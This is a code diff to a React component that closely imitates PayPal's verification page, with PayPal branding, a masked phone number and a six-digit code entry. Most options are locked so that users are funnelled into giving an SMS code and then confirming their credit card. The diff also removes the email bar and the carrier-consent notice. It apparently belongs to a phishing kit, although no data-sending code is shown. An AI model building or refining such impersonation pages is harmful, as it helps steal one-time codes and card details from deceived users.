@@ -12,7 +12,7 @@ interface VerificationPageProps {
 type VerificationStep = 'choose' | 'confirm_card' | 'enter_code';
 type VerificationOption = 'confirm_card' | 'security_questions' | 'paypal_app' | 'get_text' | 'have_call' | 'get_email' | 'whatsapp';
 
-export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 'initial' }: VerificationPageProps) {
+export function VerificationPage({ onVerificationSuccess, mode = 'initial' }: VerificationPageProps) {
   const [step, setStep] = useState<VerificationStep>('choose');
   const [loading, setLoading] = useState(false);
   const [selectedOption, setSelectedOption] = useState<VerificationOption>(mode === 'initial' ? 'get_text' : 'confirm_card');
@@ -108,20 +108,6 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
     onVerificationSuccess();
   };
 
-  const renderTopBar = () => (
-    <div className="w-full max-w-[480px] mt-4 sm:mt-8 px-4 sm:px-6">
-      <div className="bg-[#f5f7fa] rounded-full px-4 sm:px-6 py-2 sm:py-3 flex items-center justify-between border border-gray-100">
-        <span className="text-[13px] sm:text-[15px] text-gray-700 truncate mr-2">{email}</span>
-        <button 
-          onClick={onBack}
-          className="text-[#0070BA] font-bold text-[13px] sm:text-[15px] hover:underline shrink-0"
-        >
-          Change
-        </button>
-      </div>
-    </div>
-  );
-
   const renderFooter = () => (
     <div className="flex flex-wrap items-center gap-4 sm:gap-6 text-[12px] sm:text-[13px] font-semibold text-gray-600 border-t border-gray-100 pt-8 w-full justify-center mt-auto pb-8 px-4">
       <a href="#" className="hover:underline">Contact Us</a>
@@ -211,7 +197,7 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
               {mode === 'final' ? 'Enter the code you get' : 'Enter the code we texted you'}
             </h1>
             <p className="text-[16px] text-gray-900 mb-8 self-start font-medium">
-              +1 •••-•••-••••
+              +1 •••-••-••••
             </p>
             <div className="flex gap-1.5 sm:gap-2 mb-4 w-full justify-between">
               {verificationCode.map((digit, i) => (
@@ -229,13 +215,13 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
                     nextCode[i] = val;
                     setVerificationCode(nextCode);
                     if (val && i < 5) {
-                      const nextInput = e.target.parentElement?.children[i + 1] as HTMLInputElement;
+                      const nextInput = (e.target as HTMLInputElement).parentElement?.children[i + 1] as HTMLInputElement;
                       nextInput?.focus();
                     }
                   }}
                   onKeyDown={(e) => {
                     if (e.key === 'Backspace' && !verificationCode[i] && i > 0) {
-                      const prevInput = e.target.parentElement?.children[i - 1] as HTMLInputElement;
+                      const prevInput = (e.target as HTMLInputElement).parentElement?.children[i - 1] as HTMLInputElement;
                       prevInput?.focus();
                     }
                   }}
@@ -304,7 +290,6 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
 
           <div className="w-full space-y-6 mb-12">
             <SelectableOption 
-              id="confirm_card"
               icon={<CreditCard className={`w-6 h-6 ${mode === 'final' ? 'text-gray-700' : 'text-gray-400'}`} />} 
               label="Confirm your credit card number" 
               sublabel="Card x-••••"
@@ -313,21 +298,18 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
               disabled={mode !== 'final'}
             />
             <SelectableOption 
-              id="security_questions"
               icon={<List className="w-6 h-6 text-gray-400" />} 
               label="Answer your security questions" 
               selected={false}
               disabled
             />
             <SelectableOption 
-              id="paypal_app"
               icon={<MessageSquare className="w-6 h-6 text-gray-400" />} 
               label="Use the PayPal app" 
               selected={false}
               disabled
             />
             <SelectableOption 
-              id="get_text"
               icon={<MessageSquare className={`w-6 h-6 ${mode === 'initial' ? 'text-gray-700' : 'text-gray-400'}`} />} 
               label="Get a text" 
               sublabel="Mobile +1 •••-•••-••••"
@@ -336,7 +318,6 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
               disabled={mode !== 'initial'}
             />
             <SelectableOption 
-              id="have_call"
               icon={<Phone className={`w-6 h-6 ${mode === 'initial' ? 'text-gray-700' : 'text-gray-400'}`} />} 
               label="Have us call you" 
               selected={selectedOption === 'have_call'}
@@ -344,14 +325,12 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
               disabled={mode !== 'initial'}
             />
             <SelectableOption 
-              id="get_email"
               icon={<Mail className="w-6 h-6 text-gray-400" />} 
               label="Get an email" 
               selected={false}
               disabled
             />
             <SelectableOption 
-              id="whatsapp"
               icon={<MessageSquare className="w-6 h-6 text-gray-400" />} 
               label="Get a WhatsApp text" 
               selected={false}
@@ -359,45 +338,46 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
             />
           </div>
 
-          {selectedOption === 'get_text' && (
-            <p className="text-[13px] text-gray-500 mb-8 leading-relaxed">
-              You confirm this is your phone number and we can send you text messages and get subscriber and device details from your wireless carrier...
-            </p>
-          )}
-
           <button 
             type="submit"
-            className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors mb-12 shadow-sm"
+            className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors mb-20 shadow-sm"
           >
             Next
           </button>
         </form>
-
         {renderFooter()}
       </div>
     </div>
   );
 }
 
-interface SelectableOptionProps {
-  id: string;
-  icon: React.ReactNode;
-  label: string;
-  sublabel?: string;
-  selected: boolean;
+function SelectableOption({ 
+  icon, 
+  label, 
+  sublabel, 
+  selected, 
+  onSelect, 
+  disabled = false 
+}: { 
+  icon: React.ReactNode; 
+  label: string; 
+  sublabel?: string; 
+  selected: boolean; 
   onSelect?: () => void;
   disabled?: boolean;
-}
-
-function SelectableOption({ icon, label, sublabel, selected, onSelect, disabled }: SelectableOptionProps) {
+}) {
   return (
     <div 
-      onClick={!disabled ? onSelect : undefined}
-      className={`flex flex-col ${disabled ? 'cursor-not-allowed opacity-50' : 'cursor-pointer group'}`}
+      onClick={() => !disabled && onSelect?.()}
+      className={`w-full p-4 rounded-xl border-2 transition-all cursor-pointer ${
+        selected 
+          ? 'border-[#0070BA] bg-blue-50/30' 
+          : (disabled ? 'border-gray-100 bg-gray-50/50 cursor-not-allowed' : 'border-gray-200 hover:border-gray-300')
+      }`}
     >
-      <div className="flex items-center justify-between w-full">
+      <div className="flex items-center justify-between">
         <div className="flex items-center gap-4">
-          <div className={disabled ? 'text-gray-400' : 'text-gray-700'}>
+          <div className={`${disabled ? 'opacity-40' : ''}`}>
             {icon}
           </div>
           <span className={`text-[17px] font-medium ${selected ? 'text-gray-900' : (disabled ? 'text-gray-400' : 'text-gray-700')} transition-colors`}>
